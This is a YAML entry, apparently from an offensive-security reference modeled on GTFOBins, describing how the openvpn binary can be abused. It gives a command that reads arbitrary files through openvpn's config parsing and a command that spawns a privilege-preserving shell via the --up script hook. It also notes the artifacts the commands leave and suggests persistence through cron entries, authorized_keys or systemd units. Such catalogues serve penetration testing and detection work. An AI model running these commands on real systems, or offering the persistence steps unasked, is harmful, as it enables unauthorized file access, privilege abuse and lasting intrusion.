---
name: openvpn
capabilities:
- exec
- spawn
- read
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: openvpn --config /path/to/input-file
  notes: The file is actually parsed and the first partial wrong line is returned in an error message.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: openvpn --dev null --script-security 2 --up '/bin/sh -p -s'
references:
- https://gtfobins.github.io/gtfobins/openvpn/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
